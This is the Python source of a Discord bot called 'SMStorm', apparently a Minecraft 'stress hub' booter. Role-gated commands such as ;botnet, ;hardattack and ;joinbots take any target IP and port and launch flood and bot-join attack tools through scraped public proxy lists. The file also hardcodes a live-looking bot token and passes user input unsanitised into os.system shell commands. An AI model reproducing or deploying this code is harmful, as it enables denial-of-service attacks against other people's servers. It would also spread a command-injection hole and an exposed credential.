import discord
from discord.ext import commands
from discord.ext.commands import Bot
import os
import threading
import requests
import urllib.request
import json
import asyncio
import sqlite3
import time
import sched
token = "NzUyNDM0NjczNTYwMzIyMDQ5.X1XlZQ.mxwfYB8UbHZxaaOYLVXIq5695x0"

client = commands.Bot(command_prefix=';')
client.remove_command('help')


@client.event
async def on_ready():
    activity = discord.Game(name=";help | by maste#3801", type=3)
    await client.change_presence(status=discord.Status.idle, activity=activity)
    print("SMStorm wlaczony, wykonany przez maste.")

@client.command()
@commands.has_role('SMStorm')
async def reload(ctx):
    def update():
        os.system('rm proxies.txt')
        os.system('rm socks4.txt')
        os.system('rm http.txt')
        os.system('wget https://api.openproxylist.xyz/socks4.txt -O proxies.txt')
        os.system('rm socks4.txt')
        os.system('wget https://api.openproxylist.xyz/socks4.txt')
        os.system('rm http.txt')
        os.system('wget https://api.openproxylist.xyz/http.txt')
    t1 = threading.Thread(target=update)

    t1.start()

    embed = discord.Embed(
        title='The new proxy has been loaded!',
        color=discord.Colour.blue()
    )

    await ctx.send(embed=embed)



@client.command()
@commands.has_role('Free Attack')
async def botjoiner(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} botjoiner 30 -1")
            os.system(f"")

        embed = discord.Embed(title='SMStorm | Minecraft Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``botjoiner``', value='**Time**: ``30sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="SMStorm | maste#3801")
        embed.set_image(url=f'http://status.mclive.eu/SMStorm/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)
        
@client.command()
@commands.has_role('Free Attack')
async def storm(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar LightSpeed.jar {arg1}:{arg2} 100 socks4.txt 1 {arg3} 30 1000 1000 1")
            os.system(f"")

        embed = discord.Embed(title='SMStorm | Minecraft Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``storm``', value='**Time**: ``30sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="SMStorm | maste#3801")
        embed.set_image(url=f'http://status.mclive.eu/SMStorm/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)
    
@client.command()
@commands.has_role('Free Attack')
async def fastjoin(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"screen -d -m timeout 30 java -jar BruTalBOOT.jar {arg1}:{arg2} 25 1 {arg3} 1000 1000 1000 100 10 socks4.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='SMStorm | Minecraft Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``fastjoin``', value='**Time**: ``30sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="SMStorm | maste#3801")
        embed.set_image(url=f'http://status.mclive.eu/SMStorm/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)


@client.command()
@commands.has_role('Free Attack')
async def netty(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} nettydowner 30 -1")
            os.system(f"")

        embed = discord.Embed(title='SMStorm | Minecraft Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``netty``', value='**Time**: ``30sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="SMStorm | maste#3801")
        embed.set_image(url=f'http://status.mclive.eu/SMStorm/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)
    
@client.command()
@commands.has_role('Free Attack')
async def ram(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} ram 30 -1")
            os.system(f"")

        embed = discord.Embed(title='SMStorm | Minecraft Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``ram``', value='**Time**: ``30sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="SMStorm | maste#3801")
        embed.set_image(url=f'http://status.mclive.eu/SMStorm/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)
    
@client.command()
@commands.has_role('Private Attack')
async def downshield(ctx, arg1, arg2, arg3, arg4):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 2 35 {arg3} {arg4} socks4.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='SMStorm | Minecraft Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``downshield``', value=f'**Time**: ``{arg4}``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="SMStorm | maste#3801")
        embed.set_image(url=f'http://status.mclive.eu/SMStorm/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

@client.command()
@commands.has_role('Private Attack')
async def hardattack(ctx, arg1, arg2, arg3, arg4):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 2 35 {arg3} {arg4} http.txt http")
            os.system(f"")

        embed = discord.Embed(title='SMStorm | Minecraft Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``hardattack``', value=f'**Time**: ``{arg4}``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="SMStorm | maste#3801")
        embed.set_image(url=f'http://status.mclive.eu/SMStorm/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

@client.command()
@commands.has_role('Free Attack')
async def http(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 2 35 {arg3} 30 http.txt http")
            os.system(f"")

        embed = discord.Embed(title='SMStorm | Minecraft Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``http``', value=f'**Time**: ``30sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="SMStorm | maste#3801")
        embed.set_image(url=f'http://status.mclive.eu/SMStorm/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)
@client.command()
@commands.has_role('Free Attack')
async def socks(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 2 35 {arg3} 30 socks4.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='SMStorm | Minecraft Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``socks``', value=f'**Time**: ``30sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="SMStorm | maste#3801")
        embed.set_image(url=f'http://status.mclive.eu/SMStorm/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)


@client.command()
@commands.has_role('Free Attack')
async def kryt(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar stroll.jar host={arg1} port={arg2} proxiesFile=socks4.txt threads=2137 attackTime=30 exploit=join")
            os.system(f"")

        embed = discord.Embed(title='SMStorm | Minecraft Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``kryt``', value=f'**Time**: ``30sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="SMStorm | maste#3801")
        embed.set_image(url=f'http://status.mclive.eu/SMStorm/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

@client.command()
@commands.has_role('Free Attack')
async def cpulag(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar BurgerSmash-0.1.jar host-{arg1} port-{arg2} socks4.txt proxymode-socks threads-50000 loop-700 debug-true time-20")
            os.system(f"")

        embed = discord.Embed(title='SMStorm | Minecraft Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``cpulag``', value=f'**Time**: ``20sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="SMStorm | maste#3801")
        embed.set_image(url=f'http://status.mclive.eu/SMStorm/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)
        
          
@client.command()
@commands.has_role('Free Attack')
async def botnet(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} botnet 30 -1")
            os.system(f"")

        embed = discord.Embed(title='SMStorm | Minecraft Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``botnet``', value='**Time**: ``30sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="SMStorm | maste#3801")
        embed.set_image(url=f'http://status.mclive.eu/SMStorm/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)
    
        
@client.command()
@commands.has_role('Free Attack')
async def joinbots(ctx, arg1, arg2, arg3, arg4):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar DeathBot.jar -move true -ping false -pingamount 10 -host {arg1} -port {arg2} -threads 10000 -nicksize 8 -stay true -stayl 2000 -nicks RANDOM -spam true -ach true -joinamount 1 -doublej true -protocol {arg3} -msg '{arg4}' -amount 1000 -proxymode NONE -login '/login blacktest123' -register '/register blacktest123 blacktest123' -time 30 -debug true")
            os.system(f"")

        embed = discord.Embed(title='SMStorm | Minecraft Stress Hub ⚡',color=discord.Colour.blue())

        embed.add_field(name=f'IP: ``{arg1}``', inline=False, value=f'**Port**: ``{arg2}``')
        embed.add_field(name=f'Method: ``joinbots``', value=f'**Time**: ``30sec``', inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    
        embed.set_footer(text="SMStorm | maste#3801")
        embed.set_image(url=f'http://status.mclive.eu/SMStorm/{arg1}/{arg2}/banner.png')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)    


@client.command()
@commands.has_permissions(manage_messages=True)
async def stopall(ctx):
    os.system("pkill 'java'")
    embed = discord.Embed(
        title='All attacks have been canceled!',
        color=discord.Colour.blue()
    )

    await ctx.send(embed=embed)


@client.command()
@commands.has_role('Free Attack')
async def help(ctx):
    embed = discord.Embed(
        title="SMStorm | Help",
        color=discord.Colour.blue()
    )
    embed.add_field(name=f'``;botjoiner <ip> <port> <protocol>``', value='``;kryt <ip> <port>``')
    embed.add_field(name=f'``;joinbots <ip> <port> <protocol> <message>``', value='``;cpulag <ip> <port>``')
    embed.add_field(name=f'``;netty <ip> <port> <protocol>``', value='``;downshield <ip> <port> <protocol> <time>``')
    embed.add_field(name=f'``;hardattack <ip> <port> <protocol> <time>``', value='``;ram <ip> <port> <protocol>``')
    embed.add_field(name=f'``;botnet <ip> <port> <protocol>``', value='``;fastjoin <ip> <port> <protocol>``')
    embed.add_field(name=f'``;socks <ip> <port> <protocol>``', value='``;http <ip> <port> <protocol>``')
    embed.add_field(name=f'``;storm <ip> <port> <protocol>``', value='``;resolve <ip>``')
    embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    embed.set_footer(text="SMStorm | maste#3801")
    embed.set_image(url=f'https://media.discordapp.net/attachments/935205224879124520/937767188968931368/rFaZjmgQzHBI6L9H.gif')
        
    await ctx.send(embed=embed)


@client.command()
@commands.has_role('Free Attack')
async def resolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="Check IP",
        color=discord.Colour.blue()
    )

    embed.add_field(name='IP:', value=json_object["ip"], inline=False)
    embed.add_field(name='Port:', value=json_object["port"], inline=False)
    embed.add_field(name="Hostname:", value=json_object["hostname"], inline=False)
    embed.add_field(name="Online:", value=json_object["online"], inline=False)

    g = json_object["ip"]
    gb = json_object["port"]

    embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/764837803263393833/934892225106706442/ac8bba06584020409cbcc4ebe8595d53.png')
    embed.set_image(url=f'http://status.mclive.eu/McRange/{g}/{gb}/banner.png')
    embed.set_footer(text="SMStorm | maste#3801")
    embed.set_image(url=f'https://media.discordapp.net/attachments/935205224879124520/937767188968931368/rFaZjmgQzHBI6L9H.gif')
    await ctx.send(embed=embed)



client.run(token)
